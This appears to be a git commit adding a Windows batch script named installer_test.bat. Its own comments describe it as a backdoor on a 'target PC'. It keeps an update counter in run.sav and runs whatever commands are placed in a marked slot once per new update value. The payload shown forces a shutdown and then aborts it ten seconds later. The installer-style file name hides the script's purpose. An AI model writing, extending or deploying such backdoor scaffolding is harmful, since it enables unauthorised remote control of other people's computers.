7fbccd2f0042ffc8e72b40169f387c39f1a0b12a
Luke Nicholls <57662212+Guest257351@users.noreply.github.com>
2021-04-08 09:12:43 +0930

    Create installer_test.bat

---
+++ installer_test.bat
@@ -0,0 +1,20 @@
+set number=1
+< run.sav (
+  set /p number=
+)
+:: ADD 1 TO UPDATE TO RUN THE CODE ::
+set update=1
+if %number% equ %update% (goto end)
+:: do not use the command exit, this will dissabled the backdoor on the target PC untill it is restarted
+:: PUT CODE IN HERE :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+shutdown /s
+timeout 10 >nul
+shutdown /a
+
+
+
+:: END CODE HERE ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+echo %update% >run.sav
+:end
+timeout 1 >nul
+exit /b
